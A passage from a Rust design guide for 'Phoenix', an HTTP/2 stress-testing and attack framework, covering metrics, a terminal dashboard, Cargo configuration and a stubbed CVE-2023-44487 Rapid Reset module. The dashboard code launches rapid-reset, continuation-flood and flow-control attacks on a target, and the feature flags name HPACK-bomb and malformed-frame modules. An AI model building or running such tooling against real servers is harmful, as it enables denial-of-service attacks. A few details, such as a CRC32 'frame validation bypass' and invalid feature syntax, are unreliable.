        MetricsSummary {
            total_connections: self.connections.len(),
            total_requests: self.global.total_requests(),
            requests_per_second: self.global.requests_per_second(),
            success_rate: self.global.success_rate(),
            average_latency: self.global.average_latency(),
            p99_latency: self.global.p99_latency(),
            throughput_mbps: self.global.throughput_mbps(),
        }
    }
}

struct TimeSeriesStore {
    data: DashMap<String, Vec<(Instant, f64)>>,
    max_points: usize,
}

impl TimeSeriesStore {
    fn new() -> Self {
        Self {
            data: DashMap::new(),
            max_points: 1000, // Keep last 1000 points
        }
    }
    
    fn record(&self, metric: &str, timestamp: Instant, value: f64) {
        let mut entry = self.data.entry(metric.to_string()).or_insert_with(Vec::new);
        
        entry.push((timestamp, value));
        
        // Trim old data
        if entry.len() > self.max_points {
            entry.remove(0);
        }
    }
    
    fn get_series(&self, metric: &str, last_n: usize) -> Option<Vec<(Instant, f64)>> {
        self.data.get(metric).map(|series| {
            let start = series.len().saturating_sub(last_n);
            series[start..].to_vec()
        })
    }
}
```

#### Exporting Metrics for Visualization
```rust
use serde_json::json;

impl RealTimeMetrics {
    fn export_json(&self) -> serde_json::Value {
        let summary = self.get_summary();
        
        json!({
            "summary": {
                "total_connections": summary.total_connections,
                "total_requests": summary.total_requests,
                "requests_per_second": summary.requests_per_second,
                "success_rate": summary.success_rate,
                "average_latency_ns": summary.average_latency.as_nanos(),
                "p99_latency_ns": summary.p99_latency.as_nanos(),
                "throughput_mbps": summary.throughput_mbps,
            },
            "active_attacks": self.attacks.iter().map(|a| {
                json!({
                    "name": a.key(),
                    "metrics": a.value().export()
                })
            }).collect::<Vec<_>>(),
            "time_series": {
                "requests_per_second": self.time_series.get_series("requests_per_second", 100)
                    .unwrap_or_default()
                    .into_iter()
                    .map(|(t, v)| json!({"time": t.elapsed().as_secs_f64(), "value": v}))
                    .collect::<Vec<_>>(),
                "success_rate": self.time_series.get_series("success_rate", 100)
                    .unwrap_or_default()
                    .into_iter()
                    .map(|(t, v)| json!({"time": t.elapsed().as_secs_f64(), "value": v}))
                    .collect::<Vec<_>>(),
            }
        })
    }
    
    fn export_prometheus(&self) -> String {
        let mut output = String::new();
        
        // Global metrics
        let summary = self.get_summary();
        output.push_str(&format!(
            "# HELP phoenix_requests_total Total number of requests\n\
             # TYPE phoenix_requests_total counter\n\
             phoenix_requests_total {}\n\n",
            summary.total_requests
        ));
        
        output.push_str(&format!(
            "# HELP phoenix_requests_per_second Current requests per second\n\
             # TYPE phoenix_requests_per_second gauge\n\
             phoenix_requests_per_second {}\n\n",
            summary.requests_per_second
        ));
        
        output.push_str(&format!(
            "# HELP phoenix_success_rate Percentage of successful requests\n\
             # TYPE phoenix_success_rate gauge\n\
             phoenix_success_rate {}\n\n",
            summary.success_rate
        ));
        
        // Connection metrics
        output.push_str("# HELP phoenix_active_connections Number of active connections\n");
        output.push_str("# TYPE phoenix_active_connections gauge\n");
        for conn in self.connections.iter() {
            output.push_str(&format!(
                "phoenix_active_connections{{connection_id=\"{}\"}} 1\n",
                conn.key()
            ));
        }
        
        output
    }
}
```

### Performance Considerations for Metrics Collection

#### 1. **Avoid Lock Contention**
```rust
// Use sharded counters for high concurrency
struct ShardedCounter {
    shards: Vec<AtomicU64>,
}

impl ShardedCounter {
    fn new(shard_count: usize) -> Self {
        let mut shards = Vec::with_capacity(shard_count);
        for _ in 0..shard_count {
            shards.push(AtomicU64::new(0));
        }
        
        Self { shards }
    }
    
    fn increment(&self, thread_id: usize) {
        let shard_index = thread_id % self.shards.len();
        self.shards[shard_index].fetch_add(1, Ordering::Relaxed);
    }
    
    fn total(&self) -> u64 {
        self.shards.iter().map(|s| s.load(Ordering::Relaxed)).sum()
    }
}
```

#### 2. **Batch Metric Updates**
```rust
struct BatchedMetrics {
    buffer: Mutex<Vec<MetricUpdate>>,
    flush_interval: Duration,
}

impl BatchedMetrics {
    async fn run_flusher(&self) {
        let mut interval = tokio::time::interval(self.flush_interval);
        
        loop {
            interval.tick().await;
            self.flush().await;
        }
    }
    
    async fn flush(&self) {
        let updates = {
            let mut buffer = self.buffer.lock().unwrap();
            std::mem::take(&mut *buffer)
        };
        
        // Process all updates at once
        for update in updates {
            self.apply_update(update);
        }
    }
}
```

#### 3. **Sampled Metrics for High Volume**
```rust
struct SampledMetrics {
    sample_rate: f64, // e.g., 0.01 for 1% sampling
    rng: Mutex<rand::rngs::ThreadRng>,
}

impl SampledMetrics {
    fn should_sample(&self) -> bool {
        let mut rng = self.rng.lock().unwrap();
        rng.gen_bool(self.sample_rate)
    }
    
    fn record_sampled(&self, value: f64) {
        if self.should_sample() {
            // Only record sampled values
            self.record(value);
        }
    }
}
```

---

## 8. Terminal UI for Real-time Dashboard {#terminal-ui}

### ratatui Crate for Terminal Interfaces

**Crate**: `ratatui`  
**Version**: 0.26.0+  
**Features**: Rich terminal UI with widgets, layouts, and styling

#### Basic Dashboard Structure
```rust
use ratatui::{
    backend::CrosstermBackend,
    widgets::{Block, Borders, Paragraph, Gauge, Sparkline, Chart, Dataset, Axis},
    layout::{Layout, Constraint, Direction},
    style::{Style, Color, Modifier},
    Terminal,
};
use std::io;

struct PhoenixDashboard {
    terminal: Terminal<CrosstermBackend<io::Stdout>>,
    metrics: Arc<RealTimeMetrics>,
    update_interval: Duration,
}

impl PhoenixDashboard {
    fn new(metrics: Arc<RealTimeMetrics>) -> Result<Self, Box<dyn std::error::Error>> {
        let backend = CrosstermBackend::new(io::stdout());
        let terminal = Terminal::new(backend)?;
        
        Ok(Self {
            terminal,
            metrics,
            update_interval: Duration::from_millis(100),
        })
    }
    
    async fn run(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        let mut interval = tokio::time::interval(self.update_interval);
        
        loop {
            interval.tick().await;
            self.draw().await?;
        }
    }
    
    async fn draw(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        self.terminal.draw(|frame| {
            let size = frame.size();
            
            // Create layout
            let chunks = Layout::default()
                .direction(Direction::Vertical)
                .margin(1)
                .constraints([
                    Constraint::Length(3),  // Header
                    Constraint::Length(6),  // Stats row
                    Constraint::Length(10), // Charts
                    Constraint::Length(8),  // Connection list
                    Constraint::Min(0),     // Logs
                ])
                .split(size);
            
            // Header
            let header = Paragraph::new("🔥 Phoenix HTTP/2 Stress Testing Framework")
                .style(Style::default().fg(Color::Red).add_modifier(Modifier::BOLD))
                .block(Block::default().borders(Borders::ALL).title("Status"));
            frame.render_widget(header, chunks[0]);
            
            // Statistics row
            let stats_chunks = Layout::default()
                .direction(Direction::Horizontal)
                .constraints([
                    Constraint::Percentage(25),
                    Constraint::Percentage(25),
                    Constraint::Percentage(25),
                    Constraint::Percentage(25),
                ])
                .split(chunks[1]);
            
            let summary = self.metrics.get_summary();
            
            // Requests per second
            let rps_gauge = Gauge::default()
                .block(Block::default().title("Requests/sec").borders(Borders::ALL))
                .gauge_style(Style::default().fg(Color::Green))
                .percent((summary.requests_per_second.min(1000.0) / 10.0) as u16); // Scale to 1000 RPS
            frame.render_widget(rps_gauge, stats_chunks[0]);
            
            // Success rate
            let success_gauge = Gauge::default()
                .block(Block::default().title("Success Rate").borders(Borders::ALL))
                .gauge_style(Style::default().fg(Color::Blue))
                .percent(summary.success_rate as u16);
            frame.render_widget(success_gauge, stats_chunks[1]);
            
            // Active connections
            let conn_text = Paragraph::new(format!("{}", summary.total_connections))
                .block(Block::default().title("Active Connections").borders(Borders::ALL))
                .style(Style::default().fg(Color::Yellow));
            frame.render_widget(conn_text, stats_chunks[2]);
            
            // Throughput
            let throughput_text = Paragraph::new(format!("{:.2} Mbps", summary.throughput_mbps))
                .block(Block::default().title("Throughput").borders(Borders::ALL))
                .style(Style::default().fg(Color::Magenta));
            frame.render_widget(throughput_text, stats_chunks[3]);
            
            // Charts area
            let chart_chunks = Layout::default()
                .direction(Direction::Horizontal)
                .constraints([
                    Constraint::Percentage(50),
                    Constraint::Percentage(50),
                ])
                .split(chunks[2]);
            
            // RPS chart
            let rps_data = self.metrics.time_series.get_series("requests_per_second", 50)
                .unwrap_or_default();
            let rps_dataset = Dataset::default()
                .name("RPS")
                .marker(ratatui::symbols::Marker::Braille)
                .style(Style::default().fg(Color::Green))
                .data(&rps_data.iter().enumerate().map(|(i, (_, v))| (i as f64, *v)).collect::<Vec<_>>());
            
            let rps_chart = Chart::new(vec![rps_dataset])
                .block(Block::default().title("Requests per Second").borders(Borders::ALL))
                .x_axis(Axis::default().title("Time"))
                .y_axis(Axis::default().title("RPS").bounds([0.0, 1000.0]));
            frame.render_widget(rps_chart, chart_chunks[0]);
            
            // Latency chart
            let latency_data = vec![
                (0.0, summary.p99_latency.as_millis() as f64),
                (1.0, summary.average_latency.as_millis() as f64),
            ];
            let latency_dataset = Dataset::default()
                .name("Latency (ms)")
                .marker(ratatui::symbols::Marker::Braille)
                .style(Style::default().fg(Color::Red))
                .data(&latency_data);
            
            let latency_chart = Chart::new(vec![latency_dataset])
                .block(Block::default().title("Latency").borders(Borders::ALL))
                .x_axis(Axis::default().title("Metric"))
                .y_axis(Axis::default().title("ms"));
            frame.render_widget(latency_chart, chart_chunks[1]);
            
            // Connection list
            let connections: Vec<String> = self.metrics.connections.iter()
                .map(|c| format!("Connection {}: {} streams", c.key(), c.value().streams_opened()))
                .collect();
            
            let conn_list = Paragraph::new(connections.join("\n"))
                .block(Block::default().title("Active Connections").borders(Borders::ALL))
                .scroll((0, 0));
            frame.render_widget(conn_list, chunks[3]);
            
            // Log area
            let logs = Paragraph::new("Attack logs will appear here...")
                .block(Block::default().title("Logs").borders(Borders::ALL))
                .scroll((0, 0));
            frame.render_widget(logs, chunks[4]);
        })?;
        
        Ok(())
    }
}
```

### Advanced Dashboard Features

#### 1. **Interactive Attack Control**
```rust
use crossterm::event::{self, Event, KeyCode, KeyEvent};

struct InteractiveDashboard {
    // ... existing fields ...
    selected_tab: usize,
    attack_config: AttackConfig,
    input_buffer: String,
}

impl InteractiveDashboard {
    async fn handle_events(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        if event::poll(Duration::from_millis(100))? {
            if let Event::Key(key) = event::read()? {
                match key.code {
                    KeyCode::Char('q') => return Ok(()), // Quit
                    KeyCode::Tab => self.selected_tab = (self.selected_tab + 1) % 3,
                    KeyCode::Char('1') => self.start_attack("rapid_reset").await?,
                    KeyCode::Char('2') => self.start_attack("continuation_flood").await?,
                    KeyCode::Char('3') => self.start_attack("flow_control").await?,
                    KeyCode::Up => self.adjust_attack_intensity(1.0),
                    KeyCode::Down => self.adjust_attack_intensity(-1.0),
                    KeyCode::Char(c) => self.input_buffer.push(c),
                    KeyCode::Enter => self.execute_command(),
                    _ => {}
                }
            }
        }
        Ok(())
    }
    
    async fn start_attack(&mut self, attack_name: &str) -> Result<(), Box<dyn std::error::Error>> {
        // Launch attack in background
        let metrics = self.metrics.clone();
        let config = self.attack_config.clone();
        let target = self.target.clone();
        
        tokio::spawn(async move {
            let attack = create_attack(attack_name, config);
            let result = attack.execute(&target).await;
            
            // Record results
            metrics.record_attack_complete(attack_name, result);
        });
        
        Ok(())
    }
}
```

#### 2. **Real-time Sparklines**
```rust
fn create_sparkline_widget(series: &[(Instant, f64)], title: &str, color: Color) -> Sparkline {
    let values: Vec<u64> = series.iter()
        .map(|(_, v)| (*v * 100.0) as u64) // Scale for visibility
        .collect();
    
    Sparkline::default()
        .block(Block::default().title(title).borders(Borders::NONE))
        .data(&values)
        .style(Style::default().fg(color))
        .max(1000) // Scale
}
```

#### 3. **Progress Bars with indicatif**
**Crate**: `indicatif`  
**Version**: 0.17.0+

```rust
use indicatif::{ProgressBar, ProgressStyle, MultiProgress, HumanDuration};

struct AttackProgress {
    multi: MultiProgress,
    attack_bars: HashMap<String, ProgressBar>,
}

impl AttackProgress {
    fn new() -> Self {
        Self {
            multi: MultiProgress::new(),
            attack_bars: HashMap::new(),
        }
    }
    
    fn add_attack(&mut self, attack_name: &str, total_streams: u64) {
        let pb = ProgressBar::new(total_streams);
        pb.set_style(
            ProgressStyle::default_bar()
                .template("{spinner:.green} [{elapsed_precise}] [{bar:40.cyan/blue}] {pos}/{len} ({eta}) {msg}")
                .unwrap()
                .progress_chars("#>-")
        );
        pb.set_message(attack_name.to_string());
        
        let pb = self.multi.add(pb);
        self.attack_bars.insert(attack_name.to_string(), pb);
    }
    
    fn update_attack(&mut self, attack_name: &str, completed: u64) {
        if let Some(pb) = self.attack_bars.get(attack_name) {
            pb.set_position(completed);
        }
    }
    
    fn finish_attack(&mut self, attack_name: &str) {
        if let Some(pb) = self.attack_bars.remove(attack_name) {
            pb.finish_with_message(format!("{} completed", attack_name));
        }
    }
}
```

### Dashboard Layout Strategies

#### 1. **Responsive Layout Manager**
```rust
struct DashboardLayout {
    constraints: Vec<Constraint>,
    min_heights: Vec<u16>,
}

impl DashboardLayout {
    fn for_terminal_size(width: u16, height: u16) -> Self {
        if height < 30 {
            // Compact mode for small terminals
            Self {
                constraints: vec![
                    Constraint::Length(2),  // Header
                    Constraint::Length(4),  // Stats
                    Constraint::Min(0),     // Content
                ],
                min_heights: vec![2, 4, 10],
            }
        } else if height < 50 {
            // Normal mode
            Self {
                constraints: vec![
                    Constraint::Length(3),  // Header
                    Constraint::Length(6),  // Stats
                    Constraint::Length(12), // Charts
                    Constraint::Length(8),  // Connections
                    Constraint::Min(0),     // Logs
                ],
                min_heights: vec![3, 6, 12, 8, 10],
            }
        } else {
            // Full mode
            Self {
                constraints: vec![
                    Constraint::Length(3),  // Header
                    Constraint::Length(6),  // Stats
                    Constraint::Length(15), // Detailed charts
                    Constraint::Length(10), // Connection details
                    Constraint::Length(8),  // Attack controls
                    Constraint::Min(0),     // Logs
                ],
                min_heights: vec![3, 6, 15, 10, 8, 10],
            }
        }
    }
}
```

#### 2. **Tabbed Interface**
```rust
struct TabbedDashboard {
    tabs: Vec<Tab>,
    active_tab: usize,
}

struct Tab {
    name: String,
    content: TabContent,
}

enum TabContent {
    Overview,
    Attacks,
    Connections,
    Metrics,
    Logs,
    Configuration,
}

impl TabbedDashboard {
    fn render_tabs(&self, frame: &mut Frame, area: Rect) {
        let titles = self.tabs.iter().map(|t| {
            let style = if self.tabs.iter().position(|x| x.name == t.name) == Some(self.active_tab) {
                Style::default().fg(Color::Yellow).add_modifier(Modifier::BOLD)
            } else {
                Style::default().fg(Color::Gray)
            };
            
            Line::from(Span::styled(&t.name, style))
        }).collect::<Vec<_>>();
        
        let tabs = Tabs::new(titles)
            .block(Block::default().borders(Borders::ALL).title("Navigation"))
            .select(self.active_tab)
            .style(Style::default().fg(Color::White))
            .highlight_style(Style::default().fg(Color::Yellow).add_modifier(Modifier::BOLD));
        
        frame.render_widget(tabs, area);
    }
    
    fn render_active_tab(&self, frame: &mut Frame, area: Rect) {
        match &self.tabs[self.active_tab].content {
            TabContent::Overview => self.render_overview(frame, area),
            TabContent::Attacks => self.render_attacks(frame, area),
            TabContent::Connections => self.render_connections(frame, area),
            TabContent::Metrics => self.render_metrics(frame, area),
            TabContent::Logs => self.render_logs(frame, area),
            TabContent::Configuration => self.render_configuration(frame, area),
        }
    }
}
```

### Performance Optimization for UI

#### 1. **Debounced Updates**
```rust
struct DebouncedUpdater {
    last_update: Instant,
    min_interval: Duration,
    pending_update: bool,
}

impl DebouncedUpdater {
    fn new(min_interval: Duration) -> Self {
        Self {
            last_update: Instant::now(),
            min_interval,
            pending_update: false,
        }
    }
    
    fn request_update(&mut self) -> bool {
        let now = Instant::now();
        
        if now.duration_since(self.last_update) >= self.min_interval {
            self.last_update = now;
            true
        } else {
            self.pending_update = true;
            false
        }
    }
    
    fn check_pending(&mut self) -> bool {
        if self.pending_update {
            let now = Instant::now();
            if now.duration_since(self.last_update) >= self.min_interval {
                self.last_update = now;
                self.pending_update = false;
                true
            } else {
                false
            }
        } else {
            false
        }
    }
}
```

#### 2. **Incremental Rendering**
```rust
struct IncrementalRenderer {
    dirty_regions: Vec<Rect>,
    full_redraw_interval: Duration,
    last_full_redraw: Instant,
}

impl IncrementalRenderer {
    fn mark_dirty(&mut self, region: Rect) {
        self.dirty_regions.push(region);
    }
    
    fn should_redraw(&self) -> bool {
        !self.dirty_regions.is_empty() || 
        Instant::now().duration_since(self.last_full_redraw) >= self.full_redraw_interval
    }
    
    fn get_dirty_regions(&mut self) -> Vec<Rect> {
        let regions = std::mem::take(&mut self.dirty_regions);
        
        if Instant::now().duration_since(self.last_full_redraw) >= self.full_redraw_interval {
            // Force full redraw periodically
            vec![Rect::new(0, 0, u16::MAX, u16::MAX)]
        } else {
            regions
        }
    }
}
```

---

## 9. Cargo.toml Dependencies and Configuration {#cargo-toml}

### Complete Cargo.toml for Phoenix Framework

```toml
[package]
name = "phoenix"
version = "0.1.0"
edition = "2021"
authors = ["Your Name <your.email@example.com>"]
description = "HTTP/2 Stress Testing & Attack Simulation Framework"
license = "MIT OR Apache-2.0"
repository = "https://github.com/yourusername/phoenix"
readme = "README.md"
keywords = ["http2", "security", "testing", "benchmark", "stress"]
categories = ["command-line-utilities", "network-programming", "security"]

# Features for modular compilation
[features]
default = ["tls", "ui", "metrics"]
tls = ["rustls", "tokio-rustls", "webpki-roots"]
ui = ["ratatui", "crossterm", "indicatif"]
metrics = ["metrics", "metrics-exporter-prometheus", "hdrhistogram"]
attacks = []  # All attack modules
full = ["tls", "ui", "metrics", "attacks"]

# Core dependencies
[dependencies]
# Async runtime
tokio = { version = "1.37", features = ["full"] }

# HTTP/2 implementation (for reference/fallback)
h2 = { version = "0.3", optional = true }
hyper = { version = "1.2", optional = true, features = ["http2", "client", "server"] }

# TLS
rustls = { version = "0.22", optional = true }
tokio-rustls = { version = "0.25", optional = true }
webpki-roots = { version = "0.26", optional = true }

# Raw I/O
bytes = "1.5"
tokio-util = { version = "0.7", features = ["codec"] }

# Terminal UI
ratatui = { version = "0.26", optional = true }
crossterm = { version = "0.27", optional = true }
indicatif = { version = "0.17", optional = true }

# Metrics and monitoring
metrics = { version = "0.22", optional = true }
metrics-exporter-prometheus = { version = "0.13", optional = true }
hdrhistogram = { version = "8.0", optional = true }

# Configuration
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"
toml = "0.8"
clap = { version = "4.4", features = ["derive", "env"] }

# Utilities
anyhow = "1.0"
thiserror = "1.0"
log = "0.4"
env_logger = "0.11"
chrono = { version = "0.4", features = ["serde"] }
rand = "0.8"
dashmap = "5.5"
arc-swap = "1.6"
lazy_static = "1.4"

# For high-performance counters
atomic-shim = "0.1"

# Optional: JSON schema for config validation
schemars = { version = "0.8", optional = true }

# Development dependencies
[dev-dependencies]
tokio = { version = "1.37", features = ["full", "test-util"] }
criterion = "0.5"
tempfile = "3.10"

# Benchmarks
[[bench]]
name = "frame_building"
harness = false

[[bench]]
name = "connection_throughput"
harness = false

# Examples
[[example]]
name = "basic_attack"
required-features = ["tls", "ui"]

[[example]]
name = "rapid_reset"
required-features = ["attacks"]

# Binary targets
[[bin]]
name = "phoenix"
path = "src/main.rs"
required-features = ["ui", "tls"]

[[bin]]
name = "phoenix-cli"
path = "src/cli/main.rs"
required-features = ["ui"]

[[bin]]
name = "phoenix-daemon"
path = "src/daemon/main.rs"
```

### Feature-Specific Configurations

#### 1. **Minimal Configuration (Core Only)**
```toml
[package]
name = "phoenix-core"
version = "0.1.0"

[dependencies]
tokio = { version = "1.37", features = ["net", "io-util", "time", "sync"] }
bytes = "1.5"
thiserror = "1.0"
```

#### 2. **Attack Module Dependencies**
```toml
# In Cargo.toml for attacks module
[dependencies.phoenix-core]
path = "../core"
version = "0.1.0"

[dependencies]
# HPACK encoding for header attacks
hpack = "0.2"

# CRC32 for frame validation bypass
crc32fast = "1.3"

# Custom frame parsing
nom = "7.1"
```

#### 3. **Web Interface Dependencies**
```toml
# Optional web dashboard
[dependencies]
warp = { version = "0.3", optional = true }
tokio-tungstenite = { version = "0.20", optional = true }
serde = { version = "1.0", features = ["derive"] }
```

### Workspace Configuration for Modular Development

```toml
# Cargo.toml at project root
[workspace]
members = [
    "core",
    "attacks",
    "ui",
    "metrics",
    "cli",
    "examples",
]

resolver = "2"

[workspace.dependencies]
tokio = { version = "1.37", features = ["full"] }
bytes = "1.5"
thiserror = "1.0"
```

#### Core Library Cargo.toml
```toml
# core/Cargo.toml
[package]
name = "phoenix-core"
version = "0.1.0"

[dependencies]
tokio = { workspace = true }
bytes = { workspace = true }
thiserror = { workspace = true }

# Internal workspace dependencies
phoenix-attacks = { path = "../attacks", optional = true }
phoenix-metrics = { path = "../metrics", optional = true }
```

### Build Configuration

#### 1. **Profile Optimizations**
```toml
[profile.dev]
opt-level = 0
debug = true
debug-assertions = true
overflow-checks = true
lto = false
panic = 'unwind'
incremental = true
codegen-units = 256
rpath = false

[profile.release]
opt-level = 3
debug = false
debug-assertions = false
overflow-checks = false
lto = true
panic = 'abort'
codegen-units = 1
rpath = false

[profile.bench]
opt-level = 3
debug = false
debug-assertions = false
overflow-checks = false
lto = true
panic = 'unwind'
codegen-units = 1
rpath = false

[profile.test]
opt-level = 0
debug = 2
debug-assertions = true
overflow-checks = true
lto = false
panic = 'unwind'
incremental = true
codegen-units = 256
```

#### 2. **Platform-Specific Features**
```toml
[target.'cfg(unix)'.dependencies]
libc = "0.2"
nix = "0.27"

[target.'cfg(windows)'.dependencies]
winapi = { version = "0.3", features = ["winuser", "winbase"] }

[target.'cfg(target_os = "linux")'.dependencies]
ioctl-rs = "0.2"
```

### Dependency Version Pinning

```toml
[patch.crates-io]
# Security fixes or performance improvements
rustls = { git = "https://github.com/rustls/rustls", rev = "v0.22.0" }
tokio = { git = "https://github.com/tokio-rs/tokio", tag = "tokio-1.37.0" }

# Local overrides for development
# phoenix-core = { path = "../local-core" }
```

### Cargo Features for Attack Modules

```toml
# Feature flags for different attack types
[features]
rapid-reset = ["dep:phoenix-attacks/rapid-reset"]
continuation-flood = ["dep:phoenix-attacks/continuation-flood"]
flow-control = ["dep:phoenix-attacks/flow-control"]
priority-attack = ["dep:phoenix-attacks/priority-attack"]
malformed-frames = ["dep:phoenix-attacks/malformed-frames"]
hpack-bomb = ["dep:phoenix-attacks/hpack-bomb"]

# Group features
all-attacks = [
    "rapid-reset",
    "continuation-flood", 
    "flow-control",
    "priority-attack",
    "malformed-frames",
    "hpack-bomb",
]
```

### Development Tools

```toml
# Additional dev tools
[dev-dependencies]
# Testing
proptest = "1.4"
quickcheck = "1.0"
mockall = "0.12"

# Fuzzing
arbitrary = { version = "1.3", features = ["derive"] }
libfuzzer-sys = "0.4"

# Documentation
rustdoc-stripper = "0.2"

# Linting
clippy = { version = "0.1", optional = true }

# Build scripts
vergen = { version = "8.2", features = ["build", "git", "gitcl"] }
```

### Build Script Example

```rust
// build.rs
use vergen::{Config, vergen};

fn main() {
    let mut config = Config::default();
    
    // Generate build info
    *config.git_mut().sha_kind_mut() = vergen::ShaKind::Short;
    *config.build_mut().time_mut() = true;
    
    if let Err(e) = vergen(config) {
        println!("cargo:warning=Vergen failed: {}", e);
    }
    
    // Platform-specific configuration
    if cfg!(target_os = "linux") {
        println!("cargo:rustc-cfg=linux");
    }
    
    // Feature detection
    if std::env::var("CARGO_FEATURE_TLS").is_ok() {
        println!("cargo:rustc-cfg=has_tls");
    }
}
```

---

## 10. Phoenix Framework Architecture {#phoenix-architecture}

### High-Level Architecture Diagram

```
┌─────────────────────────────────────────────────────────────┐
│                    Phoenix Framework                         │
├─────────────────────────────────────────────────────────────┤
│  Command Line Interface  │  Web Dashboard  │  API Server    │
└──────────────────────────┴─────────────────┴────────────────┘
                              │
┌─────────────────────────────────────────────────────────────┐
│                    Core Engine                               │
├──────────────┬──────────────┬──────────────┬───────────────┤
│ Attack       │ Connection    │ Metrics      │ Configuration │
│ Manager      │ Pool         │ Collector    │ Manager       │
└──────────────┴──────────────┴──────────────┴───────────────┘
                              │
┌─────────────────────────────────────────────────────────────┐
│                    Protocol Layer                            │
├──────────────┬──────────────┬──────────────┬───────────────┤
│ Raw Frame    │ TLS          │ HTTP/2       │ HPACK         │
│ Builder      │ Handshake    │ State Machine│ Encoder/Decoder│
└──────────────┴──────────────┴──────────────┴───────────────┘
                              │
┌─────────────────────────────────────────────────────────────┐
│                    Transport Layer                           │
├──────────────┬──────────────┬──────────────┬───────────────┤
│ TCP          │ TLS Stream   │ Proxy        │ Raw Socket    │
│ Connections  │ Management   │ Support      │ Manipulation  │
└──────────────┴──────────────┴──────────────┴───────────────┘
```

### Core Components

#### 1. **Attack Manager**
```rust
pub struct AttackManager {
    attacks: HashMap<String, Box<dyn AttackModule>>,
    scheduler: AttackScheduler,
    results: AttackResultsStore,
}

impl AttackManager {
    pub async fn execute_attack(
        &self,
        attack_name: &str,
        target: &Target,
        config: &AttackConfig,
    ) -> Result<AttackResult, AttackError> {
        let attack = self.attacks.get(attack_name)
            .ok_or(AttackError::UnknownAttack(attack_name.to_string()))?;
        
        let result = attack.execute(target, config).await;
        
        // Record results
        self.results.record(attack_name, &result);
        
        result
    }
    
    pub fn register_attack(&mut self, name: String, attack: Box<dyn AttackModule>) {
        self.attacks.insert(name, attack);
    }
}
```

#### 2. **Connection Pool**
```rust
pub struct ConnectionPool {
    connections: DashMap<ConnectionId, ConnectionHandle>,
    factory: ConnectionFactory,
    config: PoolConfig,
}

impl ConnectionPool {
    pub async fn get_connection(&self, target: &Target) -> Result<ConnectionHandle, PoolError> {
        // Try to reuse existing connection
        for entry in &self.connections {
            if entry.value().can_reuse_for(target) {
                return Ok(entry.value().clone());
            }
        }
        
        // Create new connection
        if self.connections.len() < self.config.max_connections {
            let connection = self.factory.create(target).await?;
            let handle = ConnectionHandle::new(connection);
            self.connections.insert(handle.id(), handle.clone());
            Ok(handle)
        } else {
            Err(PoolError::MaxConnectionsReached)
        }
    }
}
```

#### 3. **Metrics Collector**
```rust
pub struct MetricsCollector {
    global: GlobalMetrics,
    per_attack: DashMap<String, AttackMetrics>,
    per_connection: DashMap<ConnectionId, ConnectionMetrics>,
    exporters: Vec<Box<dyn MetricsExporter>>,
}

impl MetricsCollector {
    pub fn record_attack_start(&self, attack_name: &str) {
        self.per_attack.entry(attack_name.to_string())
            .or_insert_with(|| AttackMetrics::new(attack_name))
            .record_start();
        
        self.global.record_attack_start();
    }
    
    pub fn export_all(&self) -> MetricsSnapshot {
        MetricsSnapshot {
            timestamp: Instant::now(),
            global: self.global.snapshot(),
            attacks: self.per_attack.iter()
                .map(|e| (e.key().clone(), e.value().snapshot()))
                .collect(),
            connections: self.per_connection.len(),
        }
    }
}
```

### Attack Module Interface

```rust
#[async_trait]
pub trait AttackModule: Send + Sync {
    /// Unique name of the attack
    fn name(&self) -> &str;
    
    /// Description of what the attack does
    fn description(&self) -> &str;
    
    /// Required capabilities (TLS, raw sockets, etc.)
    fn required_capabilities(&self) -> Vec<Capability>;
    
    /// Configuration schema for this attack
    fn config_schema(&self) -> Option<serde_json::Value>;
    
    /// Execute the attack
    async fn execute(
        &self,
        target: &Target,
        config: &AttackConfig,
        context: &AttackContext,
    ) -> Result<AttackResult, AttackError>;
    
    /// Validate configuration before execution
    fn validate_config(&self, config: &AttackConfig) -> Result<(), ValidationError>;
    
    /// Estimate resource requirements
    fn estimate_resources(&self, config: &AttackConfig) -> ResourceEstimate;
}

/// Example attack implementation
pub struct RapidResetAttack {
    frame_builder: RawFrameBuilder,
}

#[async_trait]
impl AttackModule for RapidResetAttack {
    fn name(&self) -> &str {
        "rapid_reset"
    }
    
    fn description(&self) -> &str {
        "CVE-2023-44487 - Rapid Reset attack exploiting stream cancellation"
    }
    
    fn required_capabilities(&self) -> Vec<Capability> {
        vec![
            Capability::RawFrames,
            Capability::HighConcurrency,
            Capability::Tls,
        ]
    }
    
    async fn execute(
        &self,

